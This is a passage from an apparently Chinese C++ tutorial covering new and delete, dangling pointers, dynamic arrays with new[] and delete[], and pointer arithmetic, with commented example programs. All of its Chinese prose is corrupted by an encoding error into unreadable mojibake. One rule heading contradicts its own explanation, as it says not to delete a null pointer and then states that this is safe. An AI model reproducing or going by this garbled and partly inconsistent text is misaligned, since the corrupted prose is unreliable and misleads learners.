æŒ‡é’ˆå˜é‡æœ¬èº«çš„å€¼<strong>ä¸ä¼š</strong>è¢«è‡ªåŠ¨ä¿®æ”¹ï¼ˆå®ƒä»ç„¶å­˜å‚¨ç€é‚£ä¸ªç°åœ¨æ— æ•ˆçš„åœ°å€ï¼‰ï¼Œæˆä¸º**æ‚¬æŒ‚æŒ‡é’ˆ (Dangling Pointer)**ã€‚</li></ol><p><strong>é‡è¦è§„åˆ™:</strong></p><ul><li>  <strong><code>new</code> å’Œ <code>delete</code> å¿…é¡»é…å¯¹ä½¿ç”¨:</strong> æ¯ä¸ª <code>new</code> éƒ½åº”è¯¥å¯¹åº”ä¸€ä¸ª <code>delete</code>ã€‚</li><li>  <strong>ä¸è¦ <code>delete</code> åŒä¸€å—å†…å­˜ä¸¤æ¬¡:</strong> å¯¹åŒä¸€å—å†…å­˜æ‰§è¡Œä¸¤æ¬¡ <code>delete</code> æ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚</li><li>  <strong>ä¸è¦ <code>delete</code> ä¸æ˜¯ç”± <code>new</code> åˆ†é…çš„å†…å­˜:</strong> ä¾‹å¦‚ï¼Œä¸è¦ <code>delete</code> æŒ‡å‘è‡ªåŠ¨å˜é‡ï¼ˆæ ˆå˜é‡ï¼‰æˆ–é™æ€å˜é‡çš„æŒ‡é’ˆã€‚</li><li>  <strong>ä¸è¦ <code>delete</code> ç©ºæŒ‡é’ˆ (<code>nullptr</code>):</strong> å¯¹ç©ºæŒ‡é’ˆæ‰§è¡Œ <code>delete</code> æ˜¯å®‰å…¨ä¸”æ— æ•ˆæœçš„ã€‚</li><li>  <strong><code>delete</code> ä¹‹åå°†æŒ‡é’ˆè®¾ä¸º <code>nullptr</code>:</strong> é‡Šæ”¾å†…å­˜åï¼Œæœ€å¥½ç«‹å³å°†æŒ‡é’ˆè®¾ç½®ä¸º <code>nullptr</code>ï¼Œä»¥é˜²æ­¢å®ƒæˆä¸ºæ‚¬æŒ‚æŒ‡é’ˆè¢«æ„å¤–ä½¿ç”¨ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ†é…å†…å­˜</span></span><br><span class="line">    <span class="keyword">int</span> * p_value = <span class="keyword">new</span> <span class="keyword">int</span> (<span class="number">42</span>);</span><br><span class="line">    <span class="keyword">double</span> * p_temp = <span class="keyword">new</span> <span class="keyword">double</span>;</span><br><span class="line">    *p_temp = <span class="number">123.45</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before delete:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value points to: &quot;</span> &lt;&lt; *p_value &lt;&lt; <span class="string">&quot; at address &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_temp points to: &quot;</span> &lt;&lt; *p_temp &lt;&lt; <span class="string">&quot; at address &quot;</span> &lt;&lt; p_temp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    <span class="keyword">delete</span> p_value; </span><br><span class="line">    <span class="keyword">delete</span> p_temp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter delete:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// p_value å’Œ p_temp ç°åœ¨æ˜¯æ‚¬æŒ‚æŒ‡é’ˆ!</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value still holds address: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot; Accessing *p_value: &quot; &lt;&lt; *p_value &lt;&lt; std::endl; // å±é™©! æœªå®šä¹‰è¡Œä¸º</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å°†æŒ‡é’ˆè®¾ä¸º nullptr (å¥½ä¹ æƒ¯)</span></span><br><span class="line">    p_value = <span class="literal">nullptr</span>;</span><br><span class="line">    p_temp = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After setting to nullptr:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value holds: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0 æˆ–ç±»ä¼¼è¡¨ç¤ºç©ºæŒ‡é’ˆçš„å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯¹ nullptr è°ƒç”¨ delete æ˜¯å®‰å…¨çš„</span></span><br><span class="line">    <span class="keyword">delete</span> p_value; <span class="comment">// æ— æ•ˆæœ</span></span><br><span class="line">    <span class="keyword">delete</span> p_temp; <span class="comment">// æ— æ•ˆæœ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ç¤ºä¾‹:</span></span><br><span class="line">    <span class="keyword">int</span> stack_var = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_stack = &amp;stack_var;</span><br><span class="line">    <span class="comment">// delete p_stack; // ä¸¥é‡é”™è¯¯! ä¸èƒ½ delete æ ˆå†…å­˜</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> * p1 = <span class="keyword">new</span> <span class="keyword">int</span>;</span><br><span class="line">    <span class="keyword">int</span> * p2 = p1; <span class="comment">// p1 å’Œ p2 æŒ‡å‘åŒä¸€å—å†…å­˜</span></span><br><span class="line">    <span class="keyword">delete</span> p1;</span><br><span class="line">    <span class="comment">// delete p2; // ä¸¥é‡é”™è¯¯! åˆ é™¤äº†åŒä¸€å—å†…å­˜ä¸¤æ¬¡</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿˜è®° <code>delete</code> ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ï¼Œè€Œé”™è¯¯åœ°ä½¿ç”¨ <code>delete</code> åˆ™å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒæˆ–æ•°æ®æŸåã€‚æ­£ç¡®ç®¡ç†åŠ¨æ€å†…å­˜æ˜¯ C++ ç¼–ç¨‹ä¸­çš„ä¸€é¡¹é‡è¦æŠ€èƒ½ã€‚</p><h3 id="4-7-6-ä½¿ç”¨newæ¥åˆ›å»ºåŠ¨æ€æ•°ç»„"><a href="#4-7-6-ä½¿ç”¨newæ¥åˆ›å»ºåŠ¨æ€æ•°ç»„" class="headerlink" title="4.7.6 ä½¿ç”¨newæ¥åˆ›å»ºåŠ¨æ€æ•°ç»„"></a>4.7.6 ä½¿ç”¨newæ¥åˆ›å»ºåŠ¨æ€æ•°ç»„</h3><p>é™¤äº†åˆ†é…å•ä¸ªå˜é‡çš„å†…å­˜ï¼Œ<code>new</code> ä¹Ÿå¯ä»¥ç”¨æ¥åŠ¨æ€åˆ†é…<strong>æ•°ç»„</strong>ã€‚è¿™åœ¨ä½ éœ€è¦åœ¨è¿è¡Œæ—¶ç¡®å®šæ•°ç»„å¤§å°æ—¶éå¸¸æœ‰ç”¨ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pointerVariable = <span class="keyword">new</span> typeName [numberOfElements];</span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName [numberOfElements];</span><br></pre></td></tr></table></figure><ul><li>  <code>new</code>: è¿ç®—ç¬¦ã€‚</li><li>  <code>typeName</code>: æ•°ç»„å…ƒç´ çš„æ•°æ®ç±»å‹ã€‚</li><li>  <code>numberOfElements</code>: æ•°ç»„çš„å¤§å°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå˜é‡æˆ–è¡¨è¾¾å¼ï¼Œåœ¨è¿è¡Œæ—¶è®¡ç®—å…¶å€¼ã€‚</li><li>  <code>[]</code>: è¡¨æ˜è¦åˆ†é…çš„æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</li></ul><p><code>new[]</code> ä¼šåˆ†é…ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œè¶³ä»¥å®¹çº³ <code>numberOfElements</code> ä¸ª <code>typeName</code> ç±»å‹çš„å…ƒç´ ï¼Œå¹¶è¿”å›æŒ‡å‘<strong>æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ </strong>çš„æŒ‡é’ˆã€‚</p><p><strong>é‡Šæ”¾åŠ¨æ€æ•°ç»„ (<code>delete[]</code>):</strong></p><p>é‡Šæ”¾ç”± <code>new[]</code> åˆ†é…çš„æ•°ç»„å†…å­˜<strong>å¿…é¡»</strong>ä½¿ç”¨ <code>delete[]</code> è¿ç®—ç¬¦ï¼Œè€Œä¸æ˜¯ <code>delete</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [] pointerVariable;</span><br></pre></td></tr></table></figure><ul><li>  <code>delete[]</code>: ç”¨äºé‡Šæ”¾æ•°ç»„å†…å­˜çš„è¿ç®—ç¬¦ã€‚</li><li>  <code>pointerVariable</code>: æŒ‡å‘ç”± <code>new[]</code> åˆ†é…çš„æ•°ç»„å†…å­˜çš„æŒ‡é’ˆã€‚</li></ul><p><strong><code>delete[]</code> å’Œ <code>delete</code> çš„åŒºåˆ«è‡³å…³é‡è¦:</strong></p><ul><li>  <code>delete[]</code> çŸ¥é“éœ€è¦é‡Šæ”¾çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šæ­£ç¡®åœ°è°ƒç”¨æ•°ç»„ä¸­æ¯ä¸ªå¯¹è±¡ï¼ˆå¦‚æœæ˜¯ç±»ç±»å‹ï¼‰çš„ææ„å‡½æ•°ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼Œå¹¶é‡Šæ”¾æ•´ä¸ªæ•°ç»„å ç”¨çš„å†…å­˜ã€‚</li><li>  å¦‚æœå¯¹ <code>new[]</code> åˆ†é…çš„å†…å­˜ä½¿ç”¨ <code>delete</code>ï¼ˆæ²¡æœ‰ <code>[]</code>ï¼‰ï¼Œè¡Œä¸ºæ˜¯<strong>æœªå®šä¹‰çš„</strong>ã€‚å¯¹äºåŸºæœ¬ç±»å‹å¯èƒ½çœ‹ä¼¼æ­£å¸¸å·¥ä½œï¼ˆä½†ä»æ˜¯é”™è¯¯çš„ï¼‰ï¼Œä½†å¯¹äºåŒ…å«å¯¹è±¡çš„æ•°ç»„ï¼Œå¾ˆå¯èƒ½åªè°ƒç”¨ç¬¬ä¸€ä¸ªå¯¹è±¡çš„ææ„å‡½æ•°ï¼Œå¹¶å¯èƒ½å¯¼è‡´å†…å­˜æŸåæˆ–æ³„æ¼ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the size of the dynamic array: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid size.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä½¿ç”¨ new[] åˆ†é…åŠ¨æ€æ•°ç»„</span></span><br><span class="line">    <span class="keyword">int</span> * dynArray = <span class="keyword">new</span> <span class="keyword">int</span>[size]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥åˆ†é…æ˜¯å¦æˆåŠŸ (å¯é€‰ï¼Œå¯¹äºæ™®é€š new[] å¤±è´¥ä¼šæŠ›å¼‚å¸¸)</span></span><br><span class="line">    <span class="keyword">if</span> (dynArray == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory allocation failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. åƒæ™®é€šæ•°ç»„ä¸€æ ·ä½¿ç”¨æŒ‡é’ˆè®¿é—®åŠ¨æ€æ•°ç»„å…ƒç´ </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        dynArray[i] = i * <span class="number">10</span>; <span class="comment">// ä½¿ç”¨æ•°ç»„ä¸‹æ ‡è®¿é—®</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic array elements:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; dynArray[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] = &quot;</span> &lt;&lt; *(dynArray + i) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨æŒ‡é’ˆç®—æœ¯è®¿é—®</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. ä½¿ç”¨ delete[] é‡Šæ”¾åŠ¨æ€æ•°ç»„å†…å­˜</span></span><br><span class="line">    <span class="keyword">delete</span> [] dynArray;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å°†æŒ‡é’ˆè®¾ä¸º nullptr (å¥½ä¹ æƒ¯)</span></span><br><span class="line">    dynArray = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic array deleted.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ç¤ºä¾‹:</span></span><br><span class="line">    <span class="keyword">double</span> * p_arr = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">10</span>];</span><br><span class="line">    <span class="comment">// delete p_arr; // é”™è¯¯! åº”è¯¥ä½¿ç”¨ delete [] p_arr;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong></p><ul><li>  ä½¿ç”¨ <code>new typeName[size]</code> åˆ†é…åŠ¨æ€æ•°ç»„ã€‚</li><li>  ä½¿ç”¨ <code>delete [] pointerVariable</code> é‡Šæ”¾åŠ¨æ€æ•°ç»„ã€‚</li><li>  <strong>å¿…é¡»</strong>åŒ¹é… <code>new[]</code> å’Œ <code>delete[]</code>ï¼Œå¦åˆ™è¡Œä¸ºæœªå®šä¹‰ã€‚</li><li>  åŠ¨æ€æ•°ç»„æä¾›äº†åœ¨è¿è¡Œæ—¶ç¡®å®šæ•°ç»„å¤§å°çš„çµæ´»æ€§ï¼Œä½†éœ€è¦ç¨‹åºå‘˜è´Ÿè´£å†…å­˜ç®¡ç†ã€‚</li></ul><h2 id="4-8-æŒ‡é’ˆã€æ•°ç»„å’ŒæŒ‡é’ˆç®—æœ¯"><a href="#4-8-æŒ‡é’ˆã€æ•°ç»„å’ŒæŒ‡é’ˆç®—æœ¯" class="headerlink" title="4.8 æŒ‡é’ˆã€æ•°ç»„å’ŒæŒ‡é’ˆç®—æœ¯"></a>4.8 æŒ‡é’ˆã€æ•°ç»„å’ŒæŒ‡é’ˆç®—æœ¯</h2><p>æŒ‡é’ˆå’Œæ•°ç»„åœ¨ C++ ä¸­æœ‰ç€éå¸¸ç´§å¯†çš„è”ç³»ã€‚ç†è§£è¿™ç§å…³ç³»ä»¥åŠæŒ‡é’ˆç®—æœ¯å¯¹äºæœ‰æ•ˆåœ°ä½¿ç”¨ C++ å¤„ç†å†…å­˜å’Œæ•°æ®é›†åˆè‡³å…³é‡è¦ã€‚</p><h3 id="4-8-1-ç¨‹åºè¯´æ˜"><a href="#4-8-1-ç¨‹åºè¯´æ˜" class="headerlink" title="4.8.1 ç¨‹åºè¯´æ˜"></a>4.8.1 ç¨‹åºè¯´æ˜</h3><p>æŒ‡é’ˆç®—æœ¯å…è®¸æˆ‘ä»¬å¯¹æŒ‡é’ˆæ‰§è¡Œä¸€äº›ç‰¹æ®Šçš„ç®—æœ¯è¿ç®—ï¼Œä¸»è¦æ˜¯åŠ æ³•å’Œå‡æ³•ï¼Œä»¥ä¾¿åœ¨å†…å­˜ä¸­ç§»åŠ¨ï¼Œç‰¹åˆ«æ˜¯åœ¨æ•°ç»„ä¸­ã€‚</p><p><strong>æŒ‡é’ˆä¸æ•°ç»„åçš„å…³ç³»:</strong></p><p>åœ¨ C++ ä¸­ï¼Œæ•°ç»„ååœ¨å¾ˆå¤šæƒ…å†µä¸‹ä¼šè¢«éšå¼åœ°å½“ä½œæŒ‡å‘å…¶<strong>ç¬¬ä¸€ä¸ªå…ƒç´ </strong>çš„æŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> wages[<span class="number">3</span>] = &#123;<span class="number">1000.0</span>, <span class="number">2000.0</span>, <span class="number">3000.0</span>&#125;;</span><br><span class="line">    <span class="keyword">double</span> *p_wages = wages; <span class="comment">// æ•°ç»„å wages è¢«å½“ä½œæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆ (&amp;wages[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of first element (&amp;wages[0]): &quot;</span> &lt;&lt; &amp;wages[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of array name (wages):        &quot;</span> &lt;&lt; wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºä¸ &amp;wages[0] ç›¸åŒ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of pointer (p_wages):         &quot;</span> &lt;&lt; p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºä¸ &amp;wages[0] ç›¸åŒ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡æŒ‡é’ˆè®¿é—®æ•°ç»„å…ƒç´ </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First element via pointer (*p_wages): &quot;</span> &lt;&lt; *p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡é’ˆç®—æœ¯: å°†æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    p_wages = p_wages + <span class="number">1</span>; <span class="comment">// æŒ‡é’ˆåŠ  1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address after p_wages + 1:          &quot;</span> &lt;&lt; p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æŒ‡å‘ wages[1] çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *(p_wages + 1) (now *p_wages): &quot;</span> &lt;&lt; *p_wages &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨æ•°ç»„ä¸‹æ ‡è®¿é—® (å³ä½¿æ˜¯é€šè¿‡æŒ‡é’ˆ)</span></span><br><span class="line">    p_wages = wages; <span class="comment">// é‡ç½®æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing via pointer subscript p_wages[1]: &quot;</span> &lt;&lt; p_wages[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2000.0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing via array name subscript wages[1]: &quot;</span> &lt;&lt; wages[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2000.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ•°ç»„åå’ŒæŒ‡é’ˆçš„åŒºåˆ«:</span></span><br><span class="line">    <span class="comment">// 1. sizeof: sizeof(wages) æ˜¯æ•´ä¸ªæ•°ç»„çš„å¤§å° (3 * sizeof(double))</span></span><br><span class="line">    <span class="comment">//            sizeof(p_wages) æ˜¯æŒ‡é’ˆæœ¬èº«çš„å¤§å° (é€šå¸¸ 4 æˆ– 8 å­—èŠ‚)</span></span><br><span class="line">    <span class="comment">// 2. åœ°å€: &amp;wages æ˜¯æ•´ä¸ªæ•°ç»„çš„åœ°å€ (ç±»å‹æ˜¯ double(*)[3])</span></span><br><span class="line">    <span class="comment">//         &amp;p_wages æ˜¯æŒ‡é’ˆå˜é‡ p_wages è‡ªèº«çš„åœ°å€</span></span><br><span class="line">    <span class="comment">// 3. ä¿®æ”¹: æ•°ç»„å wages æ˜¯å¸¸é‡ï¼Œä¸èƒ½ä¿®æ”¹ (ä¸èƒ½ wages = wages + 1;)</span></span><br><span class="line">    <span class="comment">//         æŒ‡é’ˆ p_wages æ˜¯å˜é‡ï¼Œå¯ä»¥ä¿®æ”¹æŒ‡å‘å…¶ä»–åœ°å€ (p_wages = p_wages + 1;)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof(wages): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(wages) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof(p_wages): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(p_wages) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æŒ‡é’ˆç®—æœ¯è§„åˆ™:</strong></p><ul><li>  <strong>æŒ‡é’ˆåŠ æ•´æ•° <code>p + n</code>:</strong> ç»“æœæ˜¯ä¸€ä¸ªæŒ‡å‘ <code>p</code> åŸæ¥æŒ‡å‘ä½ç½®ä¹‹åç¬¬ <code>n</code> ä¸ª<strong>å…ƒç´ </strong>çš„åœ°å€ã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®æŒ‡é’ˆæŒ‡å‘çš„ç±»å‹å¤§å°è‡ªåŠ¨è®¡ç®—å®é™…åœ°å€åç§»é‡ï¼ˆ<code>åœ°å€ = pçš„åœ°å€ + n * sizeof(æŒ‡å‘çš„ç±»å‹)</code>ï¼‰ã€‚</li><li>  <strong>æŒ‡é’ˆå‡æ•´æ•° <code>p - n</code>:</strong> ç»“æœæ˜¯ä¸€ä¸ªæŒ‡å‘ <code>p</code> åŸæ¥æŒ‡å‘ä½ç½®ä¹‹å‰ç¬¬ <code>n</code> ä¸ªå…ƒç´ çš„åœ°å€ã€‚</li><li>  <strong>æŒ‡é’ˆå‡æŒ‡é’ˆ <code>p1 - p2</code>:</strong> ç»“æœæ˜¯ä¸¤ä¸ªæŒ‡é’ˆä¹‹é—´ç›¸éš”çš„<strong>å…ƒç´ æ•°é‡</strong>ï¼ˆä¸€ä¸ªæ•´æ•°ï¼‰ã€‚åªæœ‰å½“ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘<strong>åŒä¸€ä¸ªæ•°ç»„</strong>ï¼ˆæˆ–è¶…å‡ºæœ«å°¾ä¸€ä¸ªä½ç½®ï¼‰ä¸­çš„å…ƒç´ 